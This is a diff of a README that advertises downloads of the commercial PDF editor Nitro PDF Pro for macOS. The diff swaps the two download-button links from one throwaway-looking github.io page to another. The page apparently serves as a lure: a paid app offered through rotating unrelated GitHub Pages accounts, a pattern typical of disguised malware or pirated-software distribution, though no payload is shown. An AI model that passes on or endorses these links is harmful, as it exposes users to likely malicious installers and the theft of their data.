@@ -3,7 +3,7 @@
 Nitro PDF Pro is a powerful and easy-to-use PDF editor designed for macOS users. It offers advanced features for creating, editing, converting, and signing PDF documents, making it a complete solution for personal and business use on Mac.
 
 ## ✅ Download Nitro PDF Pro for macOS  
-[![Download Nitro PDF Pro](https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-blueviolet)](https://shuziktobehuman.github.io/huja/NitroPDF)
+[![Download Nitro PDF Pro](https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-blueviolet)](https://mitrobandus.github.io/.github/NitroPDF)
 
 ---
 
@@ -59,7 +59,7 @@ Nitro PDF Pro delivers a robust set of tools to manipulate PDF files seamlessly 
 
 ---
 
-[![Download Nitro PDF Pro](https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-blueviolet)](https://shuziktobehuman.github.io/huja/NitroPDF)
+[![Download Nitro PDF Pro](https://img.shields.io/badge/Download-Nitro%20PDF%20Pro-blueviolet)](https://mitrobandus.github.io/.github/NitroPDF)
 
 ---
 
